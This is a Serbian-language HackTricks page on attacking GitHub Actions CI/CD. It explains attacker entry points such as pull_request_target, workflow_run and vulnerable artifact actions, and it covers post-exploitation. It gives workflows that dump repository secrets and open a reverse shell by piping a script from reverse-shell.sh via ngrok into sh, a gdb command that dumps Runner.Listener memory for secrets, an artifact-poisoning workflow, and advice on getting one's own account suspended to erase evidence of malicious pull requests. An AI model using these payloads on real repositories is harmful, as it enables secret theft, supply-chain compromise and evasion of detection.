# Zloupotreba Github akcija

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Na ovoj stranici ćete pronaći:

* **Rezime svih uticaja** koje napadač može imati pristupom Github akciji
* Različiti načini **pristupa akciji**:
* Imajući **dozvole** za kreiranje akcije
* Zloupotreba **okidača vezanih za pull request**
* Zloupotreba **drugih spoljnih pristupačnih tehnika**
* **Pivotiranje** iz već kompromitovanog repozitorijuma
* Na kraju, sekcija o **tehnikama post-eksploatacije za zloupotrebu akcije iznutra** (uzrokujući pomenute uticaje)

## Rezime uticaja

Za uvod o [**Github akcijama proverite osnovne informacije**](../basic-github-information.md#github-actions).

U slučaju da možete **izvršiti proizvoljne Github akcije/ubaciti kod** u **repozitorijum**, možete biti u mogućnosti da:

* **Ukradete** **tajne** iz tog repozitorijuma/organizacije.
* Ako možete samo ubaciti, možete ukrasti sve što je već prisutno u radnom toku.
* Zloupotrebite **privilegije repozitorijuma** da pristupite drugim platformama kao što su AWS i GCP.
* **Izvršite kod u prilagođenim radnicima** (ako se koriste prilagođeni radnici) i pokušate da pivotirate odande.
* **Prepišete** kod repozitorijuma.
* Ovo zavisi od privilegija `GITHUB_TOKEN` (ako postoje).
* **Kompromitujete** **implementacije** i druge **artefakte**.
* Ako se kod implementira ili skladišti nešto, možete to izmeniti i dobiti dalji pristup.

## GITHUB\_TOKEN

Ovaj "**tajni**" (dolazi od `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) se dodeljuje kada administrator omogući ovu opciju:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ovaj token je isti onaj koji će koristiti **Github aplikacija**, tako da može pristupiti istim endpointima: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github bi trebao da objavi [**protokol**](https://github.com/github/roadmap/issues/74) koji **omogućava pristup preko repozitorijuma** unutar GitHub-a, tako da repozitorijum može pristupiti drugim internim repozitorijumima koristeći `GITHUB_TOKEN`.
{% endhint %}

Možete videti moguće **dozvole** ovog tokena na: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Imajte na umu da token **ističe nakon završetka posla**.\
Ovi tokeni izgledaju ovako: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Nekoliko interesantnih stvari koje možete uraditi sa ovim tokenom:

{% tabs %}
{% tab title="Spoji PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Odobri PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Napravi PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Napomena da ćete u nekoliko slučajeva moći pronaći **github korisničke tokene unutar Github Actions envs ili u tajnama**. Ovi tokeni vam mogu dati više privilegija nad repozitorijumom i organizacijom.
{% endhint %}

<details>

<summary>Izlistaj tajne u Github Action outputu</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje obrnutog školjka pomoću tajni</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Moguće je proveriti dozvole koje su dodeljene Github Token-u u repozitorijumima drugih korisnika **proverom logova** akcija:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljeno izvršavanje

{% hint style="info" %}
Ovo bi bio najlakši način za kompromitovanje Github akcija, jer pretpostavlja da imate pristup **kreiranju novog repozitorijuma u organizaciji**, ili imate **privilegije pisanja nad repozitorijumom**.

Ako se nalazite u ovom scenariju, jednostavno možete proveriti [tehnike post-eksploatacije](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Izvršavanje putem kreiranja repozitorijuma

Ukoliko članovi organizacije mogu **kreirati nove repozitorijume** i možete izvršavati github akcije, možete **kreirati novi repozitorijum i ukrasti tajne postavljene na nivou organizacije**.

### Izvršavanje putem nove grane

Ako možete **kreirati novu granu u repozitorijumu koji već sadrži konfigurisanu Github akciju**, možete je **izmeniti**, **učitati** sadržaj, a zatim **izvršiti tu akciju iz nove grane**. Na ovaj način možete **izvući tajne na nivou repozitorijuma i organizacije** (ali morate znati kako se zovu).

Izmenjenu akciju možete izvršiti **ručno**, kada je **kreiran PR** ili kada je **neki kod poslat** (zavisno od toga koliko želite da budete primetni):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forkovano izvršavanje

{% hint style="info" %}
Postoje različiti okidači koji mogu omogućiti napadaču da **izvrši Github akciju iz drugog repozitorijuma**. Ako su te akcije loše konfigurisane, napadač može biti u mogućnosti da ih kompromituje.
{% endhint %}

### `pull_request`

Okidač radnog toka **`pull_request`** će izvršiti radni tok svaki put kada se primi zahtev za povlačenje sa nekim izuzecima: podrazumevano, ako je **prvi put** da **saradjujete**, neki **održavač** će morati da **odobri** **pokretanje** radnog toka:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kako je **podrazumevano ograničenje** za **prvi put** saradnika, možete doprineti **popravkom ispravnog baga/greške** i zatim poslati **druge PR-ove da zloupotrebite svoje nove privilegije `pull_request`**.

**Testirao sam ovo i ne radi**: ~~Druga opcija bi bila da napravite nalog sa imenom nekoga ko je doprineo projektu i obrisao svoj nalog.~~
{% endhint %}

Osim toga, podrazumevano **onemogućava dozvole za pisanje** i **pristup tajnama** ciljnog repozitorijuma kako je navedeno u [**dokumentaciji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Izuzimajući `GITHUB_TOKEN`, **tajne se ne prenose izvršiocu** kada se radni tok pokrene iz **forkovanog** repozitorijuma. **`GITHUB_TOKEN` ima samo dozvole za čitanje** u zahtevima za povlačenje **iz forkovanih repozitorijuma**.

Napadač može izmeniti definiciju Github akcije kako bi izvršio proizvoljne stvari i dodao proizvoljne akcije. Međutim, neće moći da ukrade tajne ili prepiše repozitorijum zbog pomenutih ograničenja.

{% hint style="danger" %}
**Da, ako napadač promeni u PR-u Github akciju koja će biti pokrenuta, njegova Github akcija će biti korišćena umesto one iz izvornog repozitorijuma!**
{% endhint %}

Kako napadač takođe kontroliše izvršeni kod, čak i ako nema tajni ili dozvola za pisanje na `GITHUB_TOKEN`, napadač na primer može **učitati zlonamerne artefakte**.

### **`pull_request_target`**

Okidač radnog toka **`pull_request_target`** ima **dozvole za pisanje** na ciljnom repozitorijumu i **pristup tajnama** (i ne traži dozvolu).

Imajte na umu da okidač radnog toka **`pull_request_target`** **radi u osnovnom kontekstu** a ne u onom koji je dat od strane PR-a (da **ne bi izvršavao nepoverljiv kod**). Za više informacija o `pull_request_target` [**proverite dokumentaciju**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Osim toga, za više informacija o ovoj specifičnoj opasnoj upotrebi proverite ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Može se činiti da je zato što je **izvršeni radni tok** onaj koji je definisan u **osnovnom** a ne u PR-u, **bezbedno** koristiti **`pull_request_target`**, ali postoje **neki slučajevi gde to nije tako**.

I ovaj će imati **pristup tajnama**.

### `workflow_run`

Okidač [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) omogućava pokretanje radnog toka iz drugog radnog toka kada je `završen`, `zatražen` ili `u toku`.

U ovom primeru, radni tok je konfigurisan da se pokrene nakon zasebnog radnog toka "Pokreni testove" koji je završen:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Osim toga, prema dokumentaciji: Radni tok pokrenut događajem `workflow_run` može **pristupiti tajnama i pisati tokene, čak i ako prethodni radni tok nije**.

Ovaj tip radnog toka može biti napadnut ako **zavisi** od radnog toka koji može biti **pokrenut** od strane eksternog korisnika putem **`pull_request`** ili **`pull_request_target`**. Par ranjivih primera može se **naći u ovom blogu**. Prvi primer se sastoji od radnog toka pokrenutog od strane `workflow_run` koji preuzima kod napadača: `${{ github.event.pull_request.head.sha }}`\
Drugi primer se sastoji od **prosljeđivanja** artefakta iz **nepouzdanog** koda u radni tok **`workflow_run`** i korišćenje sadržaja ovog artefakta na način koji ga čini **ranjivim na RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li se prilikom izvršavanja iz pull\_request koristi/skida kod izvornog ili iz forkovanog PR-a

## Zloupotreba izvršavanja iz forkovanog repozitorijuma

Pomenuli smo sve načine na koje eksterni napadač može izvršiti github radni tok, sada pogledajmo kako se ova izvršavanja, ako su loše konfigurisana, mogu zloupotrebiti:

### Izvršavanje nepouzdanog checkout-a

U slučaju **`pull_request`**, radni tok će biti izvršen u **kontekstu PR-a** (tako da će izvršiti **zlonameran kod PR-a**), ali neko ga mora **autorizovati prvo** i pokrenuće se sa nekim [ograničenjima](./#pull\_request).

U slučaju radnog toka koji koristi **`pull_request_target` ili `workflow_run`** koji zavisi od radnog toka koji može biti pokrenut iz **`pull_request_target` ili `pull_request`**, izvršiće se kod izvornog repozitorijuma, tako da **napadač ne može kontrolisati izvršeni kod**.

{% hint style="danger" %}
Međutim, ako **akcija** ima **eksplicitan PR checkout** koji će **preuzeti kod iz PR-a** (a ne iz osnove), koristiće se kod koji je pod kontrolom napadača. Na primer (proverite liniju 12 gde se preuzima kod PR-a):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NESIGURNO. Dato samo kao primer.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **nepouzdan kod se izvršava tokom `npm install` ili `npm build`** jer su skripte za izgradnju i referencirani **paketi pod kontrolom autora PR-a**.

{% hint style="warning" %}
Github pretraga za ranjive akcije je: `event.pull_request pull_request_target extension:yml`, međutim, postoje različiti načini za konfigurisanje sigurnog izvršavanja poslova čak i ako je akcija konfigurisana nesigurno (kao što je korišćenje uslova o tome ko je akter koji generiše PR).
{% endhint %}

### Umetanje skripti u kontekst <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Imajte na umu da postoje određeni [**github konteksti**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) čije vrednosti kontroliše **korisnik** koji kreira PR. Ako github akcija koristi te podatke da nešto izvrši, to može dovesti do **izvršavanja proizvoljnog koda**:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Umetanje skripti** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Iz dokumentacije: Možete omogućiti da **okruženjska promenljiva bude dostupna svim sledećim koracima** u radnom toku tako što ćete definisati ili ažurirati okruženjsku promenljivu i upisati je u datoteku okruženja **`GITHUB_ENV`**.

Ako napadač može **umetnuti bilo koju vrednost** u ovu **okružnu** promenljivu, može umetnuti okružne promenljive koje mogu izvršiti kod u sledećim koracima, kao što su **LD\_PRELOAD** ili **NODE\_OPTIONS**.

Na primer ([**ovde**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ovde**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite radni tok koji veruje učitanom artefaktu da bi sadržaj artefakta bio smešten u okružnu promenljivu **`GITHUB_ENV`**. Napadač može učitati nešto poput ovoga da bi ga kompromitovao:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Ranjive Github akcije trećih strana

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao što je pomenuto u [**ovom blog postu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova Github akcija omogućava pristup artefaktima iz različitih radnih tokova i čak repozitorijuma.

Problem je u tome što, ako parametar **`path`** nije postavljen, artefakt će biti izvučen u trenutnom direktorijumu i može prebrisati datoteke koje se kasnije mogu koristiti ili čak izvršiti u radnom toku. Dakle, ako je artefakt ranjiv, napadač može zloupotrebiti ovo da bi kompromitovao druge radne tokove koji veruju artefaktu.

Primer ranjivog radnog toka:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo bi moglo biti napadnuto sa sledećim radnim tokom:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Ostali spoljni pristupi

### Hakovanje izbrisanog repozitorijuma sa imenom prostora

Ako neki korisnički nalog promeni ime, drugi korisnik može registrovati nalog sa istim imenom nakon nekog vremena. Ako je repozitorijum imao **manje od 100 zvezdica pre promene imena**, Github će dozvoliti novom registrovanom korisniku sa istim imenom da kreira **repozitorijum sa istim imenom** kao onaj koji je izbrisan.

{% hint style="danger" %}
Dakle, ako akcija koristi repozitorijum koji ne postoji, još uvek je moguće da napadač može kreirati taj nalog i kompromitovati akciju.
{% endhint %}

Ako su druge repozitorijume koristile **zavisnosti iz ovih korisničkih repozitorijuma**, napadač će moći da ih preuzme. Ovde imate detaljnije objašnjenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivoting repozitorijuma

{% hint style="info" %}
U ovoj sekciji ćemo govoriti o tehnikama koje bi omogućile prelazak sa jednog repozitorijuma na drugi, pretpostavljajući da imamo neku vrstu pristupa prvom (proverite prethodnu sekciju).
{% endhint %}

### Trovanje keša

Keš se održava između **izvršavanja radnih tokova na istoj grani**. To znači da ako napadač **kompromituje** **pakovanje** koje se zatim čuva u kešu i **preuzme** i izvrši privilegovaniji radni tok, moći će takođe da **kompromituje** taj radni tok.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Trovanje artefakta

Radni tokovi mogu koristiti **artefakte iz drugih radnih tokova i čak repozitorijuma**, ako napadač uspe da **kompromituje** Github akciju koja **uploaduje artefakt** koji kasnije koristi drugi radni tok, može **kompromitovati druge radne tokove**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post eksploatacija iz akcije

### Pristupanje AWS i GCP putem OIDC

Proverite sledeće stranice:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Pristupanje tajnama <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadržaj u skriptu, korisno je znati kako možete pristupiti tajnama:

* Ako je tajna ili token postavljen kao **promenljiva okruženja**, može se direktno pristupiti putem okruženja koristeći **`printenv`**.

<details>

<summary>Izlistaj tajne u izlazu Github akcije</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje obrnutog školjka pomoću tajni</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Ako se tajna koristi **direktno u izrazu**, generisani shell skript je smešten **na disku** i dostupan je.
* ```bash
cat /home/runner/work/_temp/*
```
* Za JavaScript akcije, tajne se šalju putem okruženjskih promenljivih
* ```bash
ps axe | grep node
```
*   Za **prilagođene akcije**, rizik može varirati u zavisnosti od toga kako program koristi tajnu koju je dobio iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Zloupotreba samostalnih izvršilaca

Način da se sazna koje **Github akcije se izvršavaju na infrastrukturi koja nije Github** je pretraga **`runs-on: self-hosted`** u konfiguraciji yaml Github akcije.

**Samostalni izvršioci** mogu imati pristup **dodatno osetljivim informacijama**, drugim **mrežnim sistemima** (ranjive tačke na mreži? metapodaci usluge?) ili, čak i ako je izolovan i uništen, **više od jedne akcije može se izvršavati istovremeno** i zlonamerna akcija može **ukrasti tajne** druge akcije.

Na samostalnim izvršiocima takođe je moguće dobiti **tajne iz procesa **_**Runner.Listener**_** koji će sadržati sve tajne radnih tokova u bilo kom koraku tako što će se isprazniti njegova memorija:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Pogledajte [**ovaj post za više informacija**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Moguće je napraviti Github akcije koje će **izgraditi i sačuvati Docker sliku unutar Github-a**.\
Primer se može naći u sledećem proširivom delu:

<details>

<summary>Github Akcija Izgradnja &#x26; Slanje Docker Slike</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao što možete videti u prethodnom kodu, Github registar je smešten na **`ghcr.io`**.

Korisnik sa dozvolama za čitanje nad repozitorijumom će moći da preuzme Docker Image koristeći lični pristupni token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Zatim, korisnik može pretraživati **procurjela tajna u slojevima Docker slike:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Osetljive informacije u zapisima Github akcija

Čak i ako **Github** pokušava **detektovati tajne vrednosti** u zapisima akcija i **izbegava prikazivanje** istih, **ostali osetljivi podaci** koji mogu biti generisani tokom izvršavanja akcije neće biti sakriveni. Na primer, JWT potpisan tajnom vrednošću neće biti sakriven, osim ako nije [posebno konfigurisan](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Sakrivanje tragova

(Tehnika sa [**ovde**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prvo, svaki podneseni PR je jasno vidljiv javnosti na Github-u i ciljanom Github nalogu. Na Github-u, podrazumevano, **ne možemo obrisati PR sa interneta**, ali postoji preokret. Za Github naloge koji su **suspendovani** od strane Github-a, svi njihovi **PR-ovi automatski se brišu** i uklanjaju sa interneta. Dakle, da biste sakrili svoju aktivnost, morate ili **suspendovati svoj GitHub nalog ili označiti svoj nalog**. To bi **sakrilo sve vaše aktivnosti** na Github-u sa interneta (u osnovi uklonilo sve vaše zloupotrebe PR-ova).

Organizacija na Github-u vrlo aktivno prijavljuje naloge Github-u. Sve što trebate uraditi je da "podelite neke stvari" u Problemu i oni će se pobrinuti da vaš nalog bude suspendovan za 12 sati :p i eto, vaša zloupotreba postaje nevidljiva na Github-u.

{% hint style="warning" %}
Jedini način za organizaciju da shvati da su bili meta je da proveri Github dnevnike iz SIEM-a, jer bi PR bio uklonjen sa Github UI-ja.
{% endhint %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
